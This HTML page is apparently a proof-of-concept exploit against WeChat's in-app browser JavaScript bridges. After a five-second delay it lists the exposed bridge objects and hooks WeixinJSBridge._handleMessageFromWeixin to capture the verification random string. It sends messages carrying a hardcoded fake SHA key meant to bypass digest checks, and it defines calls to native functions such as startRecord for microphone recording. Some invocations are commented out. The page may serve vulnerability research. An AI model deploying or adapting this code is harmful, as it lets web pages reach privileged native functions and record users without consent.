<html>
<body>	
	<pre id='log'></pre>
	<h1>Wait 5sec for doing something good...</h1>
	<script>
		var __Mywx = undefined;
		var _callback_count = 1004;
		var isDgtVerifyEnabled = false;
		var orig_handleMessageFromWeixin = undefined;
		const EVENT_ID = '__event_id';
		const SHA_KEY = '__sha_key';
		var randomStr = undefined;

		function mylog(string) {
		  	var log = document.getElementById('log');
		  	if (log) {				
		    		log.innerText += string+'\n';
		  	}
		}

		function sendMessage(msg)
	  	{
	  		var msgArray = []; msgArray.push(msg);
	  		var msgArrayString = JSON.stringify(msgArray);

	  		if( isDgtVerifyEnabled ) {
	  			var FakeStr = 'f118b270e25a7e734bd85e6f3a13b955dfd8ae2e';
	  			var retMap = {};
	  			retMap['__json_message'] = msgArray;
	  			retMap['__sha_key'] = FakeStr;
	  			msgArrayString = JSON.stringify(retMap);
	  		}

			__Mywx._sendMessage(msgArrayString);			
	  	}

	  	function call(func, params) {
	  		if(typeof params !== 'object') {
	  			params = {};
	  		}

	  		var callbackID = (_callback_count++).toString();

	  		var msgObj = {
	  			'func': func,
	  			'params': params
	  		};

	  		msgObj['__msg_type'] = 'call';
	  		msgObj['__callback_id'] = callbackID;

	  		sendMessage(JSON.stringify(msgObj));
	  	}

	  	// function setFontSizeCallbackWithHASH() {
	  	// 	var callbackID = (_callback_count++).toString();

	  	// 	var msgObj = {
	  	// 		'func': 'setFontSizeCallback',
	  	// 		'params': {'fontSize': '8'}
	  	// 	};

	  	// 	msgObj['__msg_type'] = 'call';
	  	// 	msgObj['__callback_id'] = callbackID;

	  	// 	var msg = {
	  	// 		'__json_message': JSON.stringify(msgObj),
	  	// 		'__sha_key': 'f118b270e25a7e734bd85e6f3a13b955dfd8ae2e'
	  	// 	};

	  	// 	__Mywx._sendMessage(JSON.stringify(msg));
	  	// }

	   	function setFontSizeCallback(fontSize)
  		{
  			call('setFontSizeCallback', {
  				"fontSize" : fontSize
  			});

  			mylog('setFontSizeCallback Done');
  		}

	   	function startRecord()
  		{
  			var data = {
  				"appId" : "",
  				"duration" : 5
  			};

  			call('startRecord', data);

  			mylog('startRecord Done');
  		}

  		if(typeof window.__wx !== 'undefined') {
	    	__Mywx = window.__wx;
	    	__Mywx._ready(true);
	    	mylog('[+] __wx is alive, yeah!');
	    }

	   	window.addEventListener('load', function(event) {
			setTimeout(()=> {	
				mylog("[+] Document load done");
		  		mylog("[+] Print Javascript-bridges available");
		  		if(typeof window.WeixinJSBridge !== 'undefined') {
		  			mylog('[-] WeixinJSBridge');
		  			orig_handleMessageFromWeixin = window.WeixinJSBridge._handleMessageFromWeixin;
        			window.WeixinJSBridge._handleMessageFromWeixin = function (msg) {
            			mylog("[-] Hook window.WeixinJSBridge._handleMessageFromWeixin");

            			// save randomStr
            			if( msg[EVENT_ID] == 'sys:updateRandomStr' ) {
            				randomStr = msg['randomStr'];
            				mylog("[*] updateRandomStr: "+randomStr);
            			}

            			return orig_handleMessageFromWeixin(msg);
        			}
		  		}

		    	if(typeof window.WeixinJSContext !== 'undefined') mylog('[-] WeixinJSContext');
		    	if(typeof window.xwebToNative !== 'undefined') mylog('[-] xwebToNative');
		    	if(typeof window.webSearchJSApi !== 'undefined') mylog('[-] webSearchJSApi');
		    	if(typeof window.__wxtag !== 'undefined') mylog('[-] __wxtag');
		    	if(typeof window.CustomFullscreenApi !== 'undefined') mylog('[-] CustomFullscreenApi');
		    	mylog("[+] Print Javascript-bridges End");

				// isDgtVerifyEnabled = true;
				// setFontSizeCallback("6");
				// isDgtVerifyEnabled = false;
				// setFontSizeCallback("7");
				// mylog('random: ' + __Mywx._getDgtVerifyRandomStr());
			}, 
			5000);
		});
  </script>
</body>
</html>
